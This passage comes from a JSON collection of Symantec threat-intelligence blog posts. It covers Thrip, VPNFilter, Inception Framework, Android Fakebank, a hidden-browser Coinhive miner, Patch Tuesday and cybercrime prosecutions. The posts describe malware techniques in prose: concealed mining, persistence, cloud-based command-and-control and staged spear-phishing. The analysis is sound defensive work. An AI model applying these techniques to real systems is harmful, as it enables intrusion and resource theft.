scripts are legitimate. Similarly, PsExec is frequently used by systems administrators. However, in this case, it was Thrip’s use of PsExec that drew our attention. Through advanced artificial intelligence and machine learning, TAA has trained itself to spot patterns of malicious activity. While PsExec itself may be innocuous, the way that it was being used here triggered an alert by TAA. In short, Thrip’s attempts at camouflage blew its cover. While Thrip now makes heavy use of living off the land tactics, it also employs custom malware (Infostealer.Catchamas), particularly against computers of interest. Catchamas is a custom Trojan designed to steal information from an infected computer and contains additional features designed to avoid detection. From the initial alert triggered by TAA, we were able to follow a trail that eventually enabled us to see the bigger picture of a cyber espionage campaign originating from computers within China and targeting multiple organizations in the U.S. and Southeast Asia. Espionage is the group’s likely motive but given its interest in compromising operational systems, it could also adopt a more aggressive, disruptive stance should it choose to do so. The following protections are in place to protect customers against Thrip attacks: File-based protection Network protection products Threat intelligenceIn addition to file-based protection, customers of theDeepSight Intelligence Managed Adversary and Threat Intelligence(MATI) service have received reports on Thrip, which detail methods of detecting and thwarting activities of this group. To find out more about Targeted Attack Analytics (TAA), read our whitepaperTargeted Attack Analytics: Using Cloud-based Artificial Intelligence for Enterprise-Focused Advanced Threat Protection The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets"
  },
  {
    "title": "microsoft patch tuesday june 2018",
    "content": "As always, customers are advised to follow these security best practices: Microsoft's summary of the June 2018 releases can be found here:https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: The following is a breakdown of the issues being addressed this month: Cumulative Security Update for Microsoft Browsers Microsoft Edge Memory Corruption Vulnerability(CVE-2018-8236)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-8243)MS Rating: Critical Internet Explorer Memory Corruption Vulnerability(CVE-2018-8249)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-8267)MS Rating: Critical Microsoft Edge Memory Corruption Vulnerability(CVE-2018-8110)MS Rating: Critical Microsoft Edge Memory Corruption Vulnerability(CVE-2018-8111)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8229)MS Rating: Critical Microsoft Edge Information Disclosure Vulnerability(CVE-2018-0871)MS Rating: Important Internet Explorer Memory Corruption Vulnerability(CVE-2018-0978)MS Rating: Important Internet Explorer Security Feature Bypass Vulnerability(CVE-2018-8113)MS Rating: Important Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8227)MS Rating: Important Microsoft Edge Information Disclosure Vulnerability(CVE-2018-8234)MS Rating: Important Microsoft Edge Security Bypass Vulnerability(CVE-2018-8235)MS Rating: Important Cumulative Security Update for Microsoft Office Microsoft Outlook Elevation of Privilege Vulnerability(CVE-2018-8244)MS Rating: Important Microsoft Office Elevation of Privilege Vulnerability(CVE-2018-8245)MS Rating: Important Microsoft Excel Information Disclosure Vulnerability(CVE-2018-8246)MS Rating: Important Microsoft Office Elevation of Privilege Vulnerability(CVE-2018-8247)MS Rating: Important Microsoft Excel Remote Code Execution Vulnerability(CVE-2018-8248)MS Rating: Important Microsoft SharePoint Elevation of Privilege Vulnerability(CVE-2018-8252)MS Rating: Important Microsoft SharePoint Elevation of Privilege Vulnerability(CVE-2018-8254)MS Rating: Important Cumulative Security Update for Microsoft Hyper-V Windows Hyper-V Denial of Service Vulnerability(CVE-2018-8218)MS Rating: Important Hypervisor Code Integrity Elevation of Privilege Vulnerability(CVE-2018-8219)MS Rating: Important Cumulative Security Update for Microsoft Windows Kernel Windows Kernel Information Disclosure Vulnerability(CVE-2018-8121)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2018-8207)MS Rating: Important Windows Kernel Elevation of Privilege Vulnerability(CVE-2018-8224)MS Rating: Important Win32k Elevation of Privilege Vulnerability(CVE-2018-8233)MS Rating: Important Cumulative Security Update for Microsoft Windows Media Foundation Memory Corruption Vulnerability(CVE-2018-8251)MS Rating: Critical Windows Remote Code Execution Vulnerability(CVE-2018-8213)MS Rating: Critical Windows DNSAPI Remote Code Execution Vulnerability(CVE-2018-8225)MS Rating: Critical HTTP Protocol Stack Remote Code Execution Vulnerability(CVE-2018-8231)MS Rating: Critical Windows Elevation of Privilege Vulnerability(CVE-2018-0982)MS Rating: Important NTFS Elevation of Privilege Vulnerability(CVE-2018-1036)MS Rating: Important Windows Code Integrity Module Denial of Service Vulnerability(CVE-2018-1040)MS Rating: Important Cortana Elevation of Privilege Vulnerability(CVE-2018-8140)MS Rating: Important HIDParser Elevation of Privilege Vulnerability(CVE-2018-8169)MS Rating: Important WEBDAV Denial of Service Vulnerability(CVE-2018-8175)MS Rating: Important Windows Denial of Service Vulnerability(CVE-2018-8205)MS Rating: Important Windows Desktop Bridge Elevation of Privilege Vulnerability(CVE-2018-8208)MS Rating: Important Windows Wireless Network Profile Information Disclosure Vulnerability(CVE-2018-8209)MS Rating: Important Windows Remote Code Execution Vulnerability(CVE-2018-8210)MS Rating: Important HTTP.sys Denial of Service Vulnerability(CVE-2018-8226)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2018-8239)MS Rating: Important Windows Desktop Bridge Elevation of Privilege Vulnerability(CVE-2018-8214)MS Rating: Important Cumulative Security Update for Microsoft Device Guard Code Device Guard Code Integrity Policy Security Bypass Vulnerability(CVE-2018-8211)MS Rating: Important Device Guard Code Integrity Policy Security Bypass Vulnerability(CVE-2018-8212)MS Rating: Important Device Guard Code Integrity Policy Security Bypass Vulnerability(CVE-2018-8215)MS Rating: Important Device Guard Code Integrity Policy Security Bypass Vulnerability(CVE-2018-8216)MS Rating: Important Device Guard Code Integrity Policy Security Bypass Vulnerability(CVE-2018-8217)MS Rating: Important Device Guard Code Integrity Policy Security Bypass Vulnerability(CVE-2018-8221)MS Rating: Important Device Guard Code Integrity Policy Security Bypass Vulnerability(CVE-2018-8201)MS Rating: Important More information is available on Symantec's freeSecurity Centerportal and to our customers through the DeepSight Threat Management System. Ratheesh is a member of Symantec's Cyber Security Services organization which provides round-the-clock monitoring and protection services against cyber attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/microsoft-patch-tuesday-june-2018"
  },
  {
    "title": "industry and law enforcement cooperation bears fruit fight against bec",
    "content": "Business email attacks, operated by attackers that have evolved from 419 scams, have continued to plague organizations with an estimated $360 million stolen in 2016 raising to $675 million in 2017, according to the FBI. Symantec identified up to 7,700 distinct organizations targeted in such attacks during 2017, with each organization being attacked an average of 4.9 times during the year. As well as pursuing technical measures to block such attacks against targets, since December of 2015, Symantec has been participating in a private industry and law enforcement working group with the goal of arresting business email compromise (BEC) attackers. That joint effort, by over 450 individuals spread across private sector companies and international law enforcement agencies, has helped to enableOperation Wire-Wire, resulting in the arrest of 74 individuals in recent months. Symantec was able to contribute to this effort through the identification of email accounts and infrastructure used by various attackers. Symantec will continue to cooperate with industry and law enforcement in order to pursue additional arrests. Symantec's Security Response organization develops and deploys new security content to Symantec customers. Our team of global threat analysts operate 24x7 to track developments on the threat landscape and protect Symantec customers. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/industry-and-law-enforcement-cooperation-bears-fruit-fight-against-bec"
  },
  {
    "title": "vpnfilter iot malware",
    "content": "UPDATE: September 26, 2018:This blog has been updated to include new information that was released by Cisco Talos on seven new Stage 3 modules. For further details see below. UPDATE: June 6, 2018:This blog has been updated to include new information that was released by Cisco Talos. This includes an expanded list of vulnerable devices and details on a newly discovered stage 3 module known as “ssler” which could permit the attackers to perform man-in-the-middle (MitM) attacks on traffic going through vulnerable routers and allow them to intercept web traffic and insert malicious code into it. For further details see below. A new threat which targets a range of routers and network-attached storage (NAS) devices is capable of knocking out infected devices by rendering them unusable. The malware, known as VPNFilter, is unlike most other IoT threats because it is capable of maintaining a persistent presence on an infected device, even after a reboot. VPNFilter has a range of capabilities including spying on traffic being routed through the device. Its creators appear to have a particular interest in SCADA industrial control systems, creating a module which specifically intercepts Modbus SCADA communications. According to new research from Cisco Talos, activity surrounding the malware has stepped up in recent weeks and the attackers appear to be particularly interested in targets in Ukraine. While VPNFilter has spread widely, data from Symantec's honeypots and sensors indicate that unlike other IoT threats such as Mirai, it does not appear to be scanning and indiscriminately attempting to infect every vulnerable device globally. Q: What devices are known to be affected by VPNFilter? A: To date, VPNFilter is known to be capable of infecting enterprise and small office/home office routers from Asus, D-Link, Huawei, Linksys, MikroTik, Netgear, TP-Link, Ubiquiti, Upvel, and ZTE, as well as QNAP network-attached storage (NAS) devices. These include: Q: How does VPNFilter infect affected devices? A: Most of the devices targeted are known to use default credentials and/or have known exploits, particularly for older versions. There is no indication at present that the exploit of zero-day vulnerabilities is involved in spreading the threat. Q: What does VPNFilter do to an infected device? A: VPNFilter is a multi-staged piece of malware. Stage 1 is installed first and is used to maintain a persistent presence on the infected device and will contact a command and control (C&C) server to download further modules. Stage 2 contains the main payload and is capable of file collection, command execution, data exfiltration, and device management. It also has a destructive capability and can effectively “brick” the device if it receives a command from the attackers. It does this by overwriting a section of the device’s firmware and rebooting, rendering it unusable. There are several known Stage 3 modules, which act as plugins for Stage 2. These include a packet sniffer for spying on traffic that is routed through the device, including theft of website credentials and monitoring of Modbus SCADA protocols. Another Stage 3 module allows Stage 2 to communicate using Tor. A newly discovered (disclosed on June 6) Stage 3 module known as “ssler” is capable of intercepting all traffic going through the device via port 80, meaning the attackers can snoop on web traffic and also tamper with it to perform man-in-the-middle (MitM) attacks. Among its features is the capability to change HTTPS requests to ordinary HTTP requests, meaning data that is meant to be encrypted is sent insecurely. This can be used to harvest credentials and other sensitive information from the victim’s network. The discovery of this module is significant since it provides the attackers with a means of moving beyond the router and on to the victim’s network. A fourth Stage 3 module known as “dstr” (disclosed on June 6) adds a kill command to any Stage 2 module which lacks this feature. If executed, dstr will remove all traces of VPNFilter before bricking the device. Details on seven more Stage 3 modules were released on September 26, 2018. These include: “tcpvpn”: Allows establishment of a Reverse-TCP VPN on compromised devices, enabling remote attacker to access internal networks behind infected devices. Q: What should I do if I’m concerned my router is infected?Concerned users are advised to use Symantec's free online tool to help check if their router is impacted by VPNFilter. This also includes instructions on what to do if the router is infected. Q: What do the attackers intend to do with VPNFilter’s destructive capability? A: This is currently unknown. One possibility is using it for disruptive purposes, by bricking a large number of infected devices. Another possibility is more selective use to cover up evidence of attacks. Q: Do Symantec/Norton products (Win/Mac/NMS) protect against this threat? A: Symantec and Norton products detect the threat asLinux.VPNFilter. Acknowledgement:Symantec wishes to thank Cisco Talos and the Cyber Threat Alliance for sharing information on this threat in advance of publication. UPDATE:Netgear is advising customers that, in addition to applying the latest firmware updates and changing default passwords, users should ensure that remote management is turned off on their router. Remote management is turned off by default and can only be turned on using the router's advanced settings. To turn it off, they should go to www.routerlogin.net in their browser and log in using their admin credentials. From there, they should click \"Advanced\" followed by \"Remote Management\". If the check box for \"Turn Remote Management On\" is selected, clear it and click \"Apply\" to save changes. UPDATE May 24, 2018:TheFBI has announcedthat it has taken immediate action to disrupt the VPNFilter, securing a court order, authorizing it to seize a domain that is part of the malware's C&C infrastructure.Meanwhile, Linksys is advising customers to change administration passwords periodically and ensure software is regularly updated. If they believe they have been infected, a factory reset of their router is recommended.  Full instructions can be found here.MikroTik has said that it is highly certain that any of its devices infected by VPNFilter had the malware installed through a vulnerability in MikroTik RouterOS software, which was patched by MikroTik in March 2017. Upgrading RouterOS software deletes VPNFilter, any other third-party files and patches the vulnerability. UPDATE May 25, 2018:QNAP has published asecurity advisory on VPNFilter. It contains guidance on how to use the company’s malware removal tool to remove any infections. Symantec's Security Response organization develops and deploys new security content to Symantec customers. Our team of global threat analysts operate 24x7 to track developments on the threat landscape and protect Symantec customers. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/vpnfilter-iot-malware"
  },
  {
    "title": "scan4you masterminds guilty",
    "content": "Two men have been found guilty of charges relating to the operation of Scan4You, a scanning service that allowed malware authors to check if their creations were detected by security products. The men were arrested overseas last year. Symantec assisted the case by testifying in court for the prosecution. Jurijs Martisevs pleaded guilty in March to charges of conspiracy and aiding and abetting computer intrusions.Ruslans Bondars was found guilty in a Virginia court yesterdayof conspiracy to violate the Computer Fraud and Abuse Act; conspiracy to commit wire fraud; and computer intrusion with intent to cause damage, and aiding and abetting. Sentencing is scheduled for September. The maximum penalties for conspiracy are five years in prison, a fine of $250,000, full restitution and forfeiture of any proceeds of the crime. The maximum penalties for computer intrusion are 10 years in prison, a fine of $250,000, full restitution and forfeiture of any proceeds of the crime. Scan4You ran from at least 2009 until 2016. Advertised on underground forums used by the cyber crime community, it was used by at least 30,000 customers. Bondars was responsible for the technical side of the service, maintaining its infrastructure and website. Martisevs took care of customer support, usually via email or instant messaging. The FBI investigation found that one Scan4You customer used the service to test malware that was then used to steal approximately 40 million credit and debit card numbers from a string of U.S. retailers. One retailer alone lost approximately $292 million from the attack. Scan4You was also used to develop the notorious Citadel financial Trojan which infected over 11 million victims worldwide and was used to steal over $500 million from victims. Symantec’s Vikram Thakur was called by the prosecution as an expert witness during the case. Thakur explained how legitimate malware scanning services work by analyzing submitted files and listing which security software vendors flag the file as malware and what they detect it as. After a file is scanned, the scan results are available to all vendors who subscribe to the service. This, Thakur said, was the crucial difference between legitimate services and their underground equivalents, whose results are shared with no one other than the person submitting the file. In order to run an underground malware scanning service, its operators would need to acquire security software from multiple vendors. Thakur told the court that use of Symantec products in any such service would be in violation of our End User License Agreement (EULA). “It’s important to distinguish between legitimate services, which allow the information security community to share information and protect customers, and illegal services which simply help malware authors try evade detection,” said Thakur. “Symantec is always happy to assist law enforcement agencies in prosecuting cyber crime.” Symantec's Security Response organization develops and deploys new security content to Symantec customers. Our team of global threat analysts operate 24x7 to track developments on the threat landscape and protect Symantec customers. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/scan4you-masterminds-guilty"
  },
  {
    "title": "latest intelligence march 2018",
    "content": "Some of the key takeaways fromMarch’s Latest Intelligence, and the threat landscape in general, include an insight into what the Inception Framework group has been up to for the past three years, the email malware rate increases for the second month in a row, and malware that conducts browser-based cryptocurrency mining without a browser. Following a significant drop in January (1 in 786 emails, down from 1 in 431 the previous month), the email malware rate rose in February and that increase continued into March. However, the increase was slight, up to 1 in 635 emails, compared to 1 in 645 for February. The Mining sector continued to have the highest email malware rate, increasing from 1 in 461 emails in February to 1 in 308 for March. In March, Symantec discovered a new cryptocurrency mining malware (Trojan.Coinminer). However, this malware is not like most coinminers—it uses an interesting technique involving browser-based coin miningwithout any visible signs of a browser being used. One advantage of this type of threat for attackers is that coin mining may not be suspected for any CPU slowdown and instead the user may blame installed software for the problem. There was an increase in the rate of phishing emails in March, up from 1 in 3,331 emails in February to 1 in 2,981 in March.Agriculture, Forestry, & Fishingwas the sector with the highest rate in March, with 1 in 1,394 received emails being a phishing attempt. The cyber espionage group known as Inception Framework is using new types of lure documents in its spear-phishing campaigns and its malware has expanded to use new types of plugins,according to research published by Symantec in March. The group has remained active over the past three years, using cloud and the Internet of Things (IoT) to hide in plain sight. The group has been targeting organizations on several continents since 2014. It wasfirst exposed by Blue Coat (now part of Symantec) in December 2014targeting the Energy and Defense sectors, and organizations in the Consultancy/Security, Aerospace, Research, and Media sectors, in addition to embassies. However, the group appeared to fall quiet in late 2014 only to return in April 2015. Symantec has kept a close eye on the group’s activities, including changes in targeted regions. While there were no new Android malware families discovered in March, the threat to mobile devices is still as serious as ever. This is highlighted in this year’sISTR (volume 23), which shows that new mobile malware variants increased by 54 percent in 2017, andan average of 24,000 malicious mobile applications were blocked by Symantec every single day. Whenever there’s an event that generates interest online it’s inevitable that there will be scams trying to take advantage of the social media engagement that follows. This year’s Oscars ceremony was no exception and it wasn’t long beforebots began targeting the Twitter accounts of award winnersin order to spread gift card spam campaigns. The bots created fake accounts with similar handles to the real celebrities’ accounts. They then began replying to tweets in the real celebrities’ feeds. These replies contained spam links and were upvoted by other bot accounts so that the maximum number of people would see them. This is just a snapshot of the news for the month. Check out theLatest Intelligencefor the big picture of the threat landscape with more charts, tables, and analysis. John-Paul has been a member of Symantec Security Response since 2012. His role involves researching, editing, writing, and publishing information on security related content across a range of media channels. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/latest-intelligence-march-2018"
  },
  {
    "title": "coin mining without browser",
    "content": "Browser-based cryptocurrency mining is making a lot of headlines recently and is affecting millions of users. This type of activity doesn’t take over your computer or steal your personal information, instead its goal is to use your CPU cycles to earn money. As covered in ourprevious cryptocurrency mining blog,browser-based mining activity exploded in the last few months of 2017. While this type of coin mining can be done in a legitimate way, where the user is informed and consent given for the mining taking place, it is illegitimate mining that concerns us. So far we’ve seen JavaScript and also WebAssembly (WASM) files being used for browser-based mining, but what’s next? How about browser-based coin mining that doesn’t involve a browser being opened? While this may sound strange, we recently came across a case where this method was being used. The case involved a portable executable file launching a web-based coinminer script to begin mining for cryptocurrency. Let’s take a closer look. The file in question is a .net executable file (0x231a3fbbc025c659be407c316aba4392f8a13915f08580398bca21082723dbf8), and .net executable files can contain various element to define different resources used by the executable. One of the resources defined within the resource section of this executable defines a user interface window (aka a form) named Form1. When we looked closer at the code that defines this form, we saw that it contained a script tag that references the Coinhive in-browser mining script, which is a clue to what this executable might do. Figure 1 shows that the JavaScript contains a reference to hxxps://coinhive[.]com/lib/miner.min.js and we already know that the Coinhive script is used for browser-based coin mining. This made us wonder what this JavaScript was doing in a PE file, so we dug a little deeper and found that it used some rather interesting techniques. The first thing we noticed after executing the file was that while mining was taking place and the Coinhive website was being visited, we didn’t see any browser running in the background. So how exactly is this JavaScript executed? This WebBrowser class enables the malware to navigate web pages inside the form and, as long as the form remains hidden, there will not be any visible cues that a browser is running. We can see in Figure 2 that a component resource manager is created of type Form1. We saw earlier how the Coinhive script is referenced in the code of Form1. The TextBox1.Text string of Form1 contains the JavaScript shown in Figure 1, which is responsible for the coin-mining activity. Also, a class named WebBrowser1 is created of WebBrowser class. This WebBrowser class enables the malware to navigate web pages inside the form and, as long as the form remains hidden, there will not be any visible cues that a browser is running. In Figure 3 we can see that the Webrowser1.DocumentText property of the WebBrowser class is given the value of TextBox1.Text, which is the JavaScript in the resource section responsible for coin mining. ThisDocumentTextproperty of theWebBrowserclass manipulates the contents of an HTML page displayed in theWebBrowsercontrol using string processing tools. This means that theNavigating,Navigated, andDocumentCompletedevents occur when this property is set, and the value of theURLproperty is no longer meaningful so will be ignored. Instead, the DocumentText property is loaded by the browser object which causes the coin-mining script to run. This gives the effect of running web browser based functionality but without a browser to be seen. To make sure that the mining restarts after each reboot, the originally executed PE file is also added to the Startup folder with the name windata0.exe. The usual tell-tale sign of browser-based coin mining is a sudden, unexpected and sustained ramp up in CPU activity. This usually manifests itself as sluggishness in the computer’s performance. When these symptoms are encountered while browsing the internet, a user might suspect that browser mining is taking place. But with an executable based browser miner, like the one discussed in this blog, the user won’t see any browser windows open so may not suspect the slowdown to be a symptom of coin mining and may, for example, blame installed software for the problem. However, using some simple tools allows us to see what’s responsible for maxing out the CPU. Using Windows Task Manager we can confirm the CPU load on the computer and, with some additional system analysis tools, we can see a number of network connections being made to coinhive.com, which confirms the presence of a miner using Coinhive scripts. We can also capture WebSocket traffic using network analysis tools and see the traffic sent between the miner and the server, which may include calculated hashes sent to the mining pool while the mining code is running. As already mentioned, browser-based miners became quite prevalent in the last few months of 2017. We can see the percentage change when looking at our network protection telemetry. Even with the recent large drops in cryptocurrency values since late January, incidents of browser-based cryptocurrency mining remains high. As we have seen in this blog, the criminals behind illegitimate mining continue to find new ways to highjack their victims’ processing power in order to enrich themselves. Symantec will continue to monitor their activities and respond in kind. Intrusion Prevention System (IPS) Signatures related to browser-based miners: Aishwarya Lonkar is a Threat Analysis Engineer on the Intrusion Prevention System (IPS) team. Her work involves analyzing the latest threats, including their behavior and network activity, and creating signatures for various Symantec products. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/coin-mining-without-browser"
  },
  {
    "title": "istr 23 cyber security threat landscape",
    "content": "Coin mining, ransomware, targeted attacks, mobile security, and attacks leveraging the software supply chain. These are just some of the topics that made headlines in infosec in 2017 and which are covered in ISTR 23, your comprehensive guide to the cyber security threat landscape, which isavailable to download now. The biggest trend in 2017 was the explosion in cryptocurrency coin mining. The surge in interest in this area was such that detections of coinminers on endpoint computers in 2017 surged by 8,500 percent. A coinminer is a file or script that is used to mine cryptocurrencies such as Monero. Cyber criminals started trying to make money this way primarily because there was a huge rise in the value of cryptocurrencies in the last quarter of 2017, making this type of cyber crime extremely profitable. Cyber criminals use coinminers to steal victims’ computer processing power and cloud CPU usage to mine cryptocurrencies. The barrier to entry for coin mining is pretty low—potentially only requiring a couple of lines of code to operate—and coin mining can allow criminals to fly under the radar in a way that is not possible with other types of cyber crime. Victims may not even realize a coinminer is slurping their computer’s power as the only impact may be a slowdown of their device that they could easily attribute to something else. However, coin mining on a device could potentially cause batteries to overheat and devices to become unusable. Coin mining also has implications for organizations. Self-propagating coinminers may require corporate networks to be shut down. Coin mining in the cloud also has financial implications for organizations that are being billed based on CPU usage. While malicious coinminers appear to thus far be primarily targeting computers, and mobile phones to some extent, as it evolves cyber criminals may increasingly target IoT devices. We observed a 600 percent increase in overall attacks on IoT devices in 2017, showing that while they didn’t make headlines like they did thanks to theMirai botnet in 2016, they are still very much a target for cyber criminals. Ransomware made headlines in 2017 thanks to theWannaCry ransomware(Ransom.WannaCry) andPetya/NotPetya(Ransom.Petya), which was a destructive wiper that masqueraded as a ransomware. However, these were not “typical” ransomware attacks, and both appear to have been the work of targeted attack groups, rather than typical cyber criminals. They were part of a new trend we have observed where ransomware is being used by targeted attack groups as a decoy, to cause disruption or, in the case of WannaCry, to try and generate revenue. The “traditional” cyber crime ransomware market made a “correction” in 2017, with fewer new ransomware families and lower ransom demands. Ransomware’s profitability in 2016 led to a crowded market and overpricing of ransom demands, but in 2017 cyber criminals seemed to find the sweet spot that victims are willing to pay. The average ransom demand in 2017 was $522, less than half of the average of 2016. Ransomware variants increased by 46 percent in 2017, which indicates that established cyber crime groups are still quite active, but there was a drop in the number of new families discovered. This may indicate less innovation on behalf of cyber criminals, and may be a sign that their focus is currently elsewhere. Some online banking threats experienced a renaissance in 2017 as ransomware groups sought to diversify, while many cyber criminals may also have focused on coin mining while cryptocurrency values were high. In this year’s ISTR we also examined the tools, tactics, and motivations of targeted attack groups. There are currently 140 targeted attack groups actively tracked by Symantec. We found that overall targeted attack activity increased by 10 percent in 2017, and the primary motive of 90 percent of groups was intelligence gathering. However, one-in-ten groups was also engaged in some kind of disruptive activity. Analysis also showed that the use of “living off the land” tools and techniques is still favored by many attack groups. The use of zero days continues to fall out of favor for many groups, with only 27 percent of the targeted attack groups known to Symantec having ever used zero days. There was an average of one supply chain attack every month in 2017, compared to four attacks annually in previous years. Somewhat related to this is another trend we observed in 2017: an increase in software update supply chain attacks. This attack type sees attackers inject malware implants into the supply chain to infect unsuspecting victims. This type of attack was the initial infection vector for the Petya/NotPetya malware, which used a Trojanized update for a Ukrainian accounting software to gain a foothold on corporate networks, before eventually spreading worldwide using the EternalBlue exploit and other methods. There was an average of one supply chain attack every month in 2017, compared to four attacks annually in previous years. These types of attacks allow attackers to infiltrate well protected networks by exploiting weaker links in their software supply chain. Threats on the mobile threat landscape continued to grow in 2017. New mobile malware variants increased by 54 percent, and an average of 24,000 malicious mobile applications were blocked every single day. The threat from grayware increased in 2017 as well. Grayware encompasses apps that aren’t entirely malicious but can be troublesome, and this type of threat increased by 20 percent compared to 2016. The challenge of ensuring mobile security is also exacerbated by the high percentage of devices, particularly Android devices, running outdated mobile operating systems. Only 20 percent of mobile devices are running the latest major release of Android, meaning 80 percent of devices are missing out on protections contained in that update. This is just a taste of the main findings from ISTR 23. To find out more about these and other areas of the cyber security threat landscape,download ISTR 23 now. You can also join Symantec threat experts in your region as they review the findings: Register here for the Americas webinar Register here for the EMEA webinar Register here for the APJ webinar Symantec's Security Response organization develops and deploys new security content to Symantec customers. Our team of global threat analysts operate 24x7 to track developments on the threat landscape and protect Symantec customers. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/istr-23-cyber-security-threat-landscape"
  },
  {
    "title": "fakebank intercepts calls banks",
    "content": "We’ve recently come across a new malicious behavior among apps infected withAndroid.Fakebank: interception of phone calls made by users to their banks. These apps are sourced from third-party Android markets and some social media sites. We’ve discovered 22 apps so far, targeting Korean bank clients. The Fakebank variants we’ve seen in the past usually collect bank SMS, record phone calls to banks, and display a fake bank login UI. This new variant, however, is able to intercept calls both incoming and outgoing. When the app is launched, it collects and submits user’s personal information to a command and control (C&C) server, and presents its display (Figure 1). The server will respond with configuration specifying the phone numbers that will be used in the scam (Figure 2). Four numbers are passed to the malware app: This allows the app to deceive users, when the configured phone numbers appear for an outgoing or incoming call: When users call a real banking phone number, the malware is able to intercept and transfer the call to the scammer’s configured phone number. When a call comes in from a scammer, the app will overlay a fake UI dialog that spoofs a legitimate bank caller ID and number. The APIs and associated permission used to carry out this deception (android.permission.SYSTEM_ALERT_WINDOW) have evolved across Android versions. This malware optimizes its version targets to avoid requesting permissions from the user: In addition to tricking users into conversations with scammers, this malicious app sends call events to the C&C server. It also has a number of layouts customized to popular phone layouts in Korea. MitigationSymantec recommends users follow these best practices to stay protected from mobile threats: ProtectionSymantec and Norton products detect this malware asAndroid.Fakebank. Shaun is a member of Symantec’s Security Technology and Response team where he is focused on security research, and innovation on mobile platforms. Martin is a member of Symantec’s Security Technology and Response team who are focused on providing round-the-clock protection against current and future cyber threats. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/fakebank-intercepts-calls-banks"
  },
  {
    "title": "inception framework hiding behind proxies",
    "content": "The cyber espionage group known as the Inception Framework has significantly developed its operations over the past three years, rolling out stealthy new tools and cleverly leveraging the cloud and the Internet of Things (IoT) in order to make its activities harder to detect. Since 2014, Symantec has found evidence of a steady stream of attacks from the Inception Framework targeted at organizations on several continents. As time has gone by, the group has become ever more secretive, hiding behind an increasingly complex framework of proxies and cloud services. The Inception Framework has been active since at least May 2014 and its activities werefirst exposed by Blue Coat (now part of Symantec) in December 2014. Right from the start, the group stood out because of its use of an advanced, highly automated framework to support its targeted attacks. This level of sophistication is rarely seen, even in the targeted attacks sphere. The nature of Inception’s targets, from 2014 right through to today, along with the capabilities of its tools, indicate that espionage is the primary motive of this groups In 2014, Inception was compromising targeted organizations using spear-phishing emails, which masqueraded as legitimate emails concerning international policy, upcoming conferences, and specific sectoral interests of the targeted organization. More than half of the group’s earlier targets were in the Energy or Defense sectors, but it also targeted organizations in the Consultancy/Security, Aerospace, Research, and Media sectors, in addition to embassies. Its activities ranged across the globe, with targets located in South Africa, Kenya, the United Kingdom, Malaysia, Suriname, along with several other European and Middle Eastern countries. Word documents attached to Inception’s spear-phishing emails leveraged two Microsoft Office vulnerabilities (CVE-2014-1761andCVE-2012-0158) to install malware on the recipient’s computer. The malware had a multi-staged structure that began with a malicious RTF document and ended with an in-memory DLL payload that communicated, via the WebDAV protocol, with a command and control (C&C) address from a legitimate cloud service provider (CloudMe.com). The name “Inception” comes from the group’s many levels of obfuscation and indirection it employed in delivering this payload. Further layers of obfuscation emerged when Blue Coat was able to determine that the attackers were communicating with CloudMe.com through a hacked network of compromised routers, the majority of which were located in South Korea. Following its exposure in late 2014, Inception fell quiet. However, this turned out to be only a brief hiatus and, by April 2015, there had been a resurgence in activity. Attacks have continued since then, right through to 2017. In the intervening years, the Inception Framework has evolved, adding additional layers of obfuscation in a bid to avoid detection. The group is using new types of lure documents in its spear-phishing campaigns and its malware has expanded to use new types of plugins. Inception has also increased its use of the cloud, and diversified the range of cloud providers it uses for C&C purposes. The locations of Inception’s targets have shifted since 2014, but the group continues to have a global reach. Russia accounted for the largest number of attacks between 2015 and 2017, followed by Ukraine, Moldova, Belgium, Iran, and France. Since 2014, the Inception Framework has steadily changed its tools and techniques. In its early attacks, the group’s malware payload (with the exception of plugins) was fully contained within an exploit document emailed to the victim. In more recent activity, these spear-phishing attacks are now a two-stage process. The group will first email the target a malicious “Reconnaissance document” which, if opened, willfingerprint the target computer, gathering information on what software it is running and whether that software is up to date. Several days later, Inception will send a second spear-phishing email to the target, with another malicious document attached. This document is designed to retrieve a remote RTF file, which contains the exploit, and open it on the target’s computer. Shortly after this RTF document is opened, the remaining stages of the Inception malware are found executing on the system. The loader DLL is responsible for decrypting and injecting the core payload DLL into memory, from an encrypted file present on disk. The core payload DLL's main function is to gather system information, execute other malware in the form of plugins, and update itself. It accesses C&C via WebDAV hosted on legitimate cloud storage providers. The use of an initial reconnaissance document allows Inception to profile the target’s computer and potentially customize any subsequent malicious document to exploit known vulnerabilities in unpatched software on the computer. By breaking its attacks up into distinct stages, Inception also makes them harder to detect. For investigators to trace an attack, each stage will have be uncovered and referenced to the other stages. Inception’s malware is modular and the attackers will load plugins based on requirements for each attack. The group has used a range of plugins in recent attacks, some of which are improved versions of plugins used in 2014, while others were previously unseen. Since 2014, Inception has widened its use of cloud service providers for C&C purposes. Whereas previously it relied on one service provider (CloudMe.com), more recently it has employed a least five cloud service providers Leveraging the cloud for C&C has a number of advantages for groups like Inception. Any C&C communications will involve encrypted traffic to a known website, meaning it is less likely to raise flags on targeted networks. Legitimate cloud services are not likely to be blacklisted. Varying the cloud service provider used adds a further degree of stealth. Once it became known Inception was using a single provider, any traffic to that provider may have attracted additional scrutiny. Symantec has notified all cloud providers affected. Where possible Symantec has provided details on the C&C accounts used by Inception to the affected cloud providers. The accounts in questions have been deleted or 